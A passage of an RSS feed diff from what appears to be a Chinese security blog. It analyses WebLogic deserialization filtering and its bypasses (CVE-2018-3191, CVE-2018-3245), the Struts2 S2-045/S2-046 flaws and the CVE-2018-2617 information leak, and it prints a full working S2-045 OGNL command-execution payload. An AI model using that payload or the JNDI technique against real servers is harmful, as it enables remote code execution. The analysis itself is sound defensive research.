+&lt;p&gt;先说一下 resolveProxyClass 这个方法里为什么用代理的接口名字和 “java.rmi.registry.Registry” 进行对比，这个是 CVE-2017-3248 漏洞的补丁。CVE-2017-3248 漏洞的利用用到 JRMPClient 这个 Gadget，ysoserial 中的 JRMPClient 用到了动态代理，代理的接口就是 “java.rmi.registry.Registry”。针对这个就出现了不少的绕过方法，比如换一个接口 java.rmi.activation.Activator，或者直接不使用代理都是可以的。这里涉及到了 JRMPClient 这个 Gadget 的具体构造，但这不属于本文的内容，想了解这个的话建议去看 ysoserial 中具体是如何构造实现的。&lt;/p&gt;
+
+&lt;p&gt;resolveClass 方法中的 checkLegacyBlacklistIfNeeded 方法是用来针对类名和包名做过滤。&lt;/p&gt;
+
+&lt;p&gt;从 checkLegacyBlacklistIfNeeded 方法跟进去直到进入 WebLogicObjectInputFilter 类的 checkLegacyBlacklistIfNeeded 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b132c32e11867.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到这里是在 Jre 自带的过滤（JEP290）不可用的情况下才会使用自身实现的方法进行过滤，如果检测到是在黑名单中会抛出异常 Unauthorized deserialization attempt。看下 isBlacklistedLegacy 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b17120fc13015.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到要是类名第一个字符为 [（在字段描述符中是数组）或是 primitiveTypes（一些基础数据类型）中的其中一个，是不会进行检测的。
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b11da62f85450.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;检测的地方有两个，一个是类名，一个包名，只要其中一个出现在 LEGACY_BLACKLIST 中便会像前面看到的抛出异常。下面来看一下 LEGACY_BLACKLIST 的值是从哪里来的。&lt;/p&gt;
+
+&lt;p&gt;看 WebLogicObjectInputFilter 的一个初始化方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b4453fdb93260.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在 Jre 的过滤不可用的情况下会设置 LEGACY_BLACKLIST 的值，跟入 getLegacyBlacklist 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b364ab0942291.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;值来自于 WebLogicFilterConfig 类的成员变量 BLACKLIST，BLACKLIST 的值由 constructLegacyBlacklist 方法生成：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b44da70d34381.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里的参数var1，var2 和 var3 对应着
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b44e40a025543.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;也就是说还可以通过启动参数来控制是否添加黑名单，动态添加或删除一些黑名单。默认情况下的话黑名单就是来自 WebLogicFilterConfig 类中的 DEFAULT_BLACKLIST_PACKAGES 和 DEFAULT_BLACKLIST_CLASSES 了。&lt;/p&gt;
+
+&lt;p&gt;打了十月份补丁之后的黑名单如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private static final String[] DEFAULT_BLACKLIST_PACKAGES = new String[]{&quot;org.apache.commons.collections.functors&quot;, &quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;, &quot;javassist&quot;, &quot;java.rmi.activation&quot;, &quot;sun.rmi.server&quot;};
+private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]{&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;, &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;, &quot;org.codehaus.groovy.runtime.MethodClosure&quot;, &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, &quot;java.rmi.server.UnicastRemoteObject&quot;, &quot;java.rmi.server.RemoteObjectInvocationHandler&quot;, &quot;com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, &quot;java.rmi.server.RemoteObject&quot;};
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;22-weblogic-使用-jep290-做的过滤&quot;&gt;2.2 WebLogic 使用 JEP290 做的过滤&lt;/h3&gt;
+
+&lt;p&gt;JEP290 是 Java9 新添加可以对序列化数据进行检测的一个特性。之后往下对 8u121，7u131 和 6u141 这几个版本也支持了。该特性可用于对序列化数据的最大字节数，深度，数组大小和引用数进行限制，当然还有对类的检测了。使用这个的方法可以为实现 ObjectInputFilter 接口（低版本的 JDK 只在 sun.misc 包中有这个类，Java9 以上在 java.io 包中，目前 Oracle 对 Java9 和 Java10 都停止支持了，最新为 Java11），然后重写 checkInput 方法来对序列化数据进行检测。高版本的 JDK 中 RMI 就有用到这个来做过滤，看下 WebLogic 是如何使用的，JDK 版本为 8u152。&lt;/p&gt;
+
+&lt;p&gt;WebLogic 是通过反射来获取到 java.io.ObjectInputFilter 或是 sun.misc.ObjectInputFilter 的各个方法的方式来实现一个 JreFilterApiProxy 对象：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b506f95518455.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;determineJreFilterSupportLevel 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b64ade1331745.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后面的流程大抵如下，根据 DEFAULT_BLACKLIST_PACKAGES 和 DEFAULT_BLACKLIST_CLASSES 的值来给 WebLogicFilterConfig 对象中的成员变量 serialFilter 赋值，serialFilter 的值是作为 JEP290 对序列化数据进行检测的一个格式（里面包含需要做检测的默认值，用分号隔开。包名后面需要带星号，包名或者类名前面带感叹号的话表示黑名单，没有则表示白名单。这些在 ObjectInputFilter 这个接口的方法中都能看到）。接下来就是反射调用 setObjectInputFilter 方法将 serialFilter 的值赋给 ObjectInputStream 中的 serialFilter（假如 ObjectInputStream 对象中的 serialFilter 值为空是不会对序列化数据进行检测的）。看一下 WebLogic 设置好的 serialFilter：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b49de51890407.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再看 ObjectInputStream 这边，图的左下可以看到从反序列化到进入检测的调用栈：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b69afdfc19889.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟入 checkInput 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b6c287d937531.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;前面有些常规的检测，红圈部分是针对 serialFilter 里的格式进行检测的，这里用到了 Function&amp;lt;T, U&amp;gt; 接口和 lambda 语法。看下 ObjectInputFilter 接口中的内部类 Global 的代码块就能明白这里是咋做的检测了。
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b90452f470763.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看到它是做的字符串对比（类名和包名）。再回到 ObjectInputStream 类中的 filterCheck 方法代码块的下面：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b6e346dd13525.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;只要返回的状态是空或者 REJECTED 就直接会抛出异常结束反序列流程了。其它的返回状态只做一个日志记录。&lt;/p&gt;
+
+&lt;h3 id=&quot;23-小结&quot;&gt;2.3 小结&lt;/h3&gt;
+
+&lt;p&gt;这一章中可以看到 WebLogic 针对反序列化的防御方法有两种，分别对应着 JEP290 不可用和可用的这两种情况。JEP290 这个的代码逻辑还是挺长的，所以在写分析的时候并没有把每一步的具体内容都写上。这两种方法都是用黑名单的方式来做的过滤，其实它们也不是不能做成白名单，个人觉得白名单的方式应该很容易影响程序的功能，因为 Java 中各种接口和类的封装导致搞不清在反序列化的时候会用到哪些接口或类，所以写代码的时候不好去确定这样一个白名单出来。目前来看这样的过滤方式只有说是在找到新的 Gadget 的情况下才能绕过，从另一个角度来看这样的过滤也使得这里会一直存在问题，只是问题还没被发现。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-weblogic-远程调试及10月补丁修复的漏洞&quot;&gt;0x03 WebLogic 远程调试及10月补丁修复的漏洞&lt;/h2&gt;
+
+&lt;h3 id=&quot;31-weblogic-远程调试&quot;&gt;3.1 WebLogic 远程调试&lt;/h3&gt;
+
+&lt;p&gt;修改 domain/bin/setDomainEnv.sh，设置 debugFlag 为true&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b6d5bf2436564.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样启动的时候会监听 8453 作为调试端口，然后使用 Idea 之类的 IDE 建立一个远程调试的配置连接到该端口就可以。需要把 WebLogic 中 jar 包添加到项目中去。因为 WebLogic 没有源码，调试时的代码都是反编译得到的，所以有监控不到变量或者执行的位置跟代码行对不上的问题。&lt;/p&gt;
+
+&lt;h3 id=&quot;31-cve-2018-3245&quot;&gt;3.1 CVE-2018-3245&lt;/h3&gt;
+
+&lt;p&gt;这个洞是 7 月份 CVE-2018-2893 的补丁还没有修复完善导致的绕过，涉及到 JRMPClient 这个 Gadget 的构造，具体可以参考&lt;a href=&quot;https://xz.aliyun.com/t/2479&quot;&gt;Weblogic JRMP反序列化漏洞回顾&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这里提一点，黑名单中添加的类名不是直接序列化对象的类名而是它的父类类名能做到过滤效果的原因是在序列化数据中是会带上父类类名的。&lt;/p&gt;
+
+&lt;h3 id=&quot;32-cve-2018-3191&quot;&gt;3.2 CVE-2018-3191&lt;/h3&gt;
+
+&lt;p&gt;这个 Gadget 不是新的，只是在 com.bea.core.repackaged.springframework 这个包里还有相关的类。&lt;/p&gt;
+
+&lt;p&gt;结合第一章提到的 readObject 这个 Gadget 是非常好理解的，只是还需要知道 JNDI 的利用方式才能完整实现利用。&lt;/p&gt;
+
+&lt;p&gt;com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager 这个类在进行反序列化的时候会触发 JNDI 查询，结合针对 JNDI 的利用便可以做到代码执行的效果。&lt;/p&gt;
+
+&lt;p&gt;JtaTransactionManager 类的 readObject 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b1060a7437750.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进入 initUserTransactionAndTransactionManager 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b14d7baf71193.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进入 lookupUserTransaction 方法再往下跟很快就可以看到 JDNI 的查询方法 lookup：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b15f32b356045.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;针对 JNDI 的一个利用前提便是 lookup 方法的参数可控，即 name 的值能被传入成一个 RMI 或者 LDAP 的绝对路径。从前面的代码可以知道这里的 name 的值来自于 JtaTransactionManager 类中的成员变量  transactionManagerName，因此只要设置 transactionManagerName 值为可控的 RMI 地址，然后将 JtaTransactionManager 对象序列化后通过 T3 协议传输给 WebLogic 便可以在 T3 协议对数据进行反序列化的时候完成利用。&lt;/p&gt;
+
+&lt;p&gt;利用演示：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b23a89d658608.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因为是针对 JDNI 的利用，所以要想在默认的情况下进行利用需要 JDK 的版本小于 8u121 或者 7u131（因为高于这些版本默认情况下已经将 trustURLCodebase 的值设为 false，使得不能做远程类加载），同时服务器需要能够连接外网。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-参考&quot;&gt;0x03 参考&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://www.nccgroup.trust/us/our-research/combating-java-deserialization-vulnerabilities-with-look-ahead-object-input-streams-laois/&lt;/li&gt;
+  &lt;li&gt;https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Thu, 18 Oct 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/10/18/unserialize-in-weblogic.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/10/18/unserialize-in-weblogic.html</guid>
+        
+        <category>Java</category>
+        
+        <category>WebLogic</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>S2-045/S2-046漏洞分析</title>
+        <description>&lt;p&gt;这是以前要写的一篇分析了，当时想的是着重分析 OGNL 的安全防护和怎么绕过的，因为针对漏洞本身的分析很多人已经写了。可惜也不是写的很细，先放这吧&lt;/p&gt;
+
+&lt;h3 id=&quot;摘要&quot;&gt;摘要&lt;/h3&gt;
+
+&lt;p&gt;3月6日，Struts2发布了关于S2-045的漏洞公告，提及到可以通过构造好的Content-Type值来实现远程代码执行攻击，影响的版本为Struts2 2.3.5 - Struts2 2.3.31，Struts2 2.5 - Struts2 2.5.10。由于在默认的情况下便可触发漏洞，并且有人发出了可以实现命令执行的Payload导致该漏洞的影响不仅广而且利用成本低，从一些SRC平台上对该漏洞的提交情况也可以看出这一点。随后在20日出来的S2-046是在S2-045的基础上的其它触发点了。由于该漏洞造成的影响非常广，所以值得对该漏洞进行一个回顾。&lt;/p&gt;
+
+&lt;h3 id=&quot;struts2-及漏洞相关背景&quot;&gt;Struts2 及漏洞相关背景&lt;/h3&gt;
+
+&lt;p&gt;Apache Struts2 是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了 Java Servlet API，鼓励开发者采用MVC架构。缘起于 Apache Struts 的 WebWork 框架，旨在提供相对于 Struts 框架的增强和改进，同时保留与 Struts 框架类似的结构。2005 年 12 月，WebWork 宣布 WebWork 2.2 以 Apache Struts2 的名义合并至 Struts。（摘自维基百科） &lt;br /&gt;
+由于 Struts2 中的 OGNL 引擎功能比较强大，可通过其来访问 Java 对象的成员变量或方法，如果输入点可控便会造成安全问题。尽管 Struts2 也有安全管理器来避免通过 OGNL 来执行命令等一些危险的操作，但是该安全管理器也是一次又一次的被绕过。&lt;/p&gt;
+
+&lt;h3 id=&quot;s2-045-漏洞详情&quot;&gt;S2-045 漏洞详情&lt;/h3&gt;
+
+&lt;p&gt;可先借助 javaagent 来查看漏洞利用过程的调用栈
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54dfec9ed13511.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到大体的流程为: &lt;br /&gt;
+FileUploadInterceptor.intercept() –&amp;gt; LocalizedTextUtil.findText() –&amp;gt; LocalizedTextUtil.getDefaultMessage() –&amp;gt; TextParseUtil.translateVariables() –&amp;gt; OgnlTextParser.evaluate()&lt;/p&gt;
+
+&lt;p&gt;使用 javaagent 来查看调用栈的好处在于只有 payload 和漏洞环境的情况下就可以大致知道漏洞的利用过程，方便接下来做动态分析。下面再使用动态分析的方式来跟一下漏洞利用的整个过程，struts2 会在 StrutsPrepareFilter 过滤器中将 HttpServletRequest 请求封装成 StrutsRequestWrapper 或是 MultiPartRequestWrapper。而这个漏洞就是发生在对 MultiPart 请求的处理上，在 StrutsPrepareFilter 类中的 doFilter 方法中下断点即可。对于这里 Get 或是 Post 请求都是一样的&lt;br /&gt;
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e0c13eb61522.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;往下跟会进入 wrapRequest 方法
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e0d3e9088471.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在这个方法中可以看到它是通过请求头中 Content-Type 的值中是否包含 “multipart/form-data” 来决定该请求是否为 MultiPart 请求，这也是为什么 payload 在 Content-Type 中需要包含 “multipart/form-data” 的原因，同时也说明了在利用的时候并不需要去构造一个上传文件的包了，只需要在请求中修改 Content-Type 的值包含 “multipart/form-data” 就行。接着通过 getMultiPartRequest 方法来获取 MultiPart 请求的处理类。
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e1f2c2730014.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到该方法从容器中获取了名字为 multipartHandlerName 的值的一个实例来作为处理器。而 multipartHandlerName 的值来自于配置中的 struts.multipart.parser 的值，该值默认为 ”jakarta“，也就是说最终获取到的是一个 JakartaMultiPartRequest 类的实例，而问题就是出现在该类中，这也解释了为啥这个漏洞能影响这么大，因为在默认的情况下就可以被利用。&lt;/p&gt;
+
+&lt;p&gt;继续往下跟的时候会进入 JakartaMultiPartRequest 类中的 parseRequest 方法，再跟入 FileItemIteratorImpl 类中的构造方法
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e315e7972112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到这里有一个对 ContentType 的值得判断，要不是以 “multipart/” 开头的话便会抛出一个 InvalidContentTypeException 的异常，跟下去看它对这里的异常信息是如何处理的，因为这个异常信息里是包含着 Content-Type 的值的，也就是说里面包含着 payload 中构造好的 OGNL 表达式。再往下跟直到 OGNL 表达式执行就是一开始通过 javaagent 看到的调用栈中的过程了，看一下 translateVariables 方法
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e43d55099495.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;会通过以 $ 或是 % 字符开头来提取出真正的表达式，所以在 payload 中使用 ${} 来写一样是可以的。&lt;/p&gt;
+
+&lt;h3 id=&quot;s2-046-漏洞详情&quot;&gt;S2-046 漏洞详情&lt;/h3&gt;
+
+&lt;p&gt;S2-046 是在 S2-045 的基础上的，只不过是触发点不一样了。流程跟 S2-045 的流程一样，在 Streams 类中的 checkFileName 方法会对文件名进行检查，若是包含空字节的话会抛出 InvalidFileNameException 异常
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c5589cffac94918.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中异常信息含有完整的文件名，这里的异常信息也经过了和 S2-045 一样的处理，也就是说文件名中的 OGNL 表达式也会被执行。针对该漏洞的利用只需要在模拟文件上传时在 Content-Disposition 的 filename 中加入空字节，并将 OGNL 表达式写到 filename 就好。S2-046 还有一个触发方式是 Content-Length 长度超过 2M，但是这种触发需要配置 struts.multipart.parser 为 jakarta-stream 才行。&lt;/p&gt;
+
+&lt;h3 id=&quot;官方修复&quot;&gt;官方修复&lt;/h3&gt;
+
+&lt;p&gt;Struts2 2.5.10.1
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c558a7278c56779.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Struts2 2.3.32
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c558a37bfa99035.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;都删掉了直接把错误信息传入 findText 函数的做法。&lt;/p&gt;
+
+&lt;h3 id=&quot;payload-分析&quot;&gt;payload 分析&lt;/h3&gt;
+
+&lt;p&gt;这是当时出来的一个 payload&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;跟了整个执行过程之后可知 “multipart/form-data” 其实只要不放在最开始的地方就好了，后面是通过系统名字来判断系统类型，执行命令后在通过 Response 来获取输出。对 payload 的分析关键在于这里它是如何绕过 Struts2 的安全管理器的。&lt;/p&gt;
+
+&lt;p&gt;跟踪下创建 OGNL 上下文的过程
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e45161076156.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对于 OGNL 的执行存在限制的三个变量都在 _memberAccess 中。allowStaticMethodAccess 是否允许访问静态方法，该值来自于配置 default.properties 中，默认为 false。excludedClasses 和 excludedPackageNames 为排除的类和包名，它们的值来自于配置 struts-default.xml 中，在 2.5.10 中为
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e579daf86515.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在 S2-032 的 payload 中只用到了一句话就绕过了安全管理器&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;对静态成员变量的访问是不受限的，可以看下 DEFAULT_MEMBER_ACCESS 的值
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c54e5a799640452.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c55870fd7c73183.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到如果拿 DEFAULT_MEMBER_ACCESS 来覆盖 _memberAccess 的值的话便不会包含到限制 OGNL 执行的三个变量，这样是可以做到绕过安全管理器的，至于这里的 _memberAccess 至于为啥能被修改可以看参考中随风的博客的链接。&lt;/p&gt;
+
+&lt;p&gt;但是从这次的 payload 中可以看出来它并不是完全依赖于覆盖的方式来绕过的，它检测了一下，要是能访问到 _memberAccess 的话便直接覆盖，不然就获取当前的上下文容器 ActionContext 再得到 ognlUtil 实例，接着通过 ognlUtil 获取到两个排除集合后将其清空，再利用 OgnlContext 中的 setMemberAccess 方法来重新设置 _memberAccess 值为 DEFAULT_MEMBER_ACCESS 从而做到绕过安全管理器。至于为啥不能再采取直接覆盖的方式了，可以看下 OGNL 包中 OgnlContext 类的变化
+&lt;img src=&quot;https://i.loli.net/2019/07/27/5d3c558a0021875592.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里比较了 ognl-3.0.13 和 ognl-3.1.12（分别对应着 S2-032 和 S2-045 影响版本中的 OGNL 版本），可以明显看到新的版本中已经将对于 _memberAccess 的操作移除掉了，所以 payload 的作者通过检测是否能访问到 _memberAccess 再决定使用什么样的方式来绕过安全管理器便应该是为了提高 payload 的适用性。对于目前的最新版本 Struts 2.5.13 和 Struts 2.3.34 用到的 OGNL 版本分别为 3.1.15 和 3.0.21，其中都在 OgnlContext 中删除了对于 context 的操作，也就是说再也没法通过 #context 获取到当前的 OgnlContext 对象了也就没法绕过安全管理器了。&lt;/p&gt;
+
+&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;
+
+&lt;p&gt;Struts2 的安全问题层出不穷，它的漏洞往往影响比较大，同时漏洞点也经常会别人吐槽。若不是业务必要应该使用更好的框架来替代它。同时也可以由此去考虑一些别的框架在使用语言表达式的时候是否会存在一些类似的安全性问题。&lt;/p&gt;
+
+&lt;h3 id=&quot;参考来源&quot;&gt;参考来源&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://bobao.360.cn/learning/detail/3649.html&lt;/li&gt;
+  &lt;li&gt;https://www.iswin.org/2016/03/20/Struts2-S2-029%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sun, 18 Feb 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/02/18/s2-045-and-046.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/02/18/s2-045-and-046.html</guid>
+        
+        <category>Java</category>
+        
+        <category>Struts2</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>CVE-2018-2617简单分析记录</title>
+        <description>&lt;p&gt;上周出来的漏洞，在 ZDI 上看说是会影响到 Weblogic 便去跟了下，后来发现这个洞并不是在 Weblogic 上的，而且也不一定会影响到 Weblogic。漏洞出现在 Oracle 的诊断助手（Diagnostic Assistant，DA）上，这玩意可以启动一个 Web 服务，要进行操作的话需要登录认证。CVE-2018-2617 就是 DA 启动的 Web 服务存在信息泄露漏洞导致可以绕过认证，再结合 CVE-2018-2615 和 CVE-2018-2615 这两个命令注入漏洞便可以实现远程命令执行。漏洞作者没有挖干净，去跟代码的时候发现除了这两个命令注入之外，还有 8 处可以做到命令注入的，其实它们的成因都是一样的了 - -。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x00-cve-2018-2617&quot;&gt;0x00 CVE-2018-2617&lt;/h3&gt;
+
+&lt;p&gt;虽然没有漏洞的细节，但是只要登录了翻下上面的功能还是挺容易就可以复现漏洞的，看个图
+&lt;img src=&quot;https://i.loli.net/2018/01/30/5a7062804ed38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看着 url 是不是挺有意思，复现的效果
+&lt;img src=&quot;https://i.loli.net/2018/01/30/5a70628a9789d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;无认证的情况下不能像第一张图那样做到系统上读任意文件（得有读权限），只能读到 output 目录下的文件。output 目录中存放着 DA 的 Web 服务的一些 log 文件和配置文件。看漏洞的描述是说通过读 log 文件中记录的敏感信息做到的认证绕过，后面看代码的时候发现 log 中确实会记录登陆密码，但是日志记录等级为 finer，而配置中的默认等级记录为 warning，不过看代码中在启动的时候会重新设置等级为 finer，但是 log 文件中没有记录到任何的登陆信息。这里整的有些乱，后面找了另外一种方法来获取登陆密码，就是取读 config 目录下的 ewallet.p12 文件，再通过该文件来获取密码。只是这种方式只能读取到通过 -save 选项启动的服务，因为只有加了这个选项才会把密码保存下来。扯了一段别的，本文主要是记录造成信息泄露漏洞的原因了，别的就不写了。&lt;/p&gt;
+
+&lt;p&gt;这玩意用的是 grizzly 包来写的 Web 服务，一开始以为是 FileViewer（对应的 url 为 /viewer/*）这个 servlet 写的有问题，后面动态调试的时候发现在进入这个 servlet 的代码之前就已经读到内容了。这里是当做静态资源读出来了的，看下图
+&lt;img src=&quot;https://i.loli.net/2018/01/30/5a70629558dbd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到 /viewer 这个 context 是被设置了可以处理静态资源的，再往下跟就是结合设置好的目录来读取文件，其中还有路径判断防止使用 .. 来跳转目录的。这些设置可以从 DaWebCli 中看到
+&lt;img src=&quot;https://i.loli.net/2018/01/30/5a70627ce1baf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里的 str1 就是对应的 output 目录路径，DefaultServlet 也是设置了可以处理静态资源的，但是路径是在 public_html 目录下，也没法往上跳所以读不到 log 之类的文件了。&lt;/p&gt;
+
+&lt;p&gt;其实整个跟下来，漏洞的成因是很简单的，主要是跟的过程中接触到了不少之前没碰到的东西，比如：对 Session 的处理，Context，Servlet 和 url 之间的匹配，但是这些东西还是等下次有更好的理解再记录了。&lt;/p&gt;
+
+&lt;p&gt;最后贴张命令注入的的图，感觉这些洞像是漏洞作者手工或黑盒测出来的
+&lt;img src=&quot;https://i.loli.net/2018/01/30/5a70627a0621f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;0x01-参考&quot;&gt;0x01 参考&lt;/h3&gt;
+&lt;p&gt;http://www.zerodayinitiative.com/advisories/ZDI-18-114/&lt;/p&gt;
+</description>
+        <pubDate>Tue, 30 Jan 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/01/30/cve-2018-2617.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/01/30/cve-2018-2617.html</guid>
+        
+        <category>Java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Java文件解压的安全问题</title>
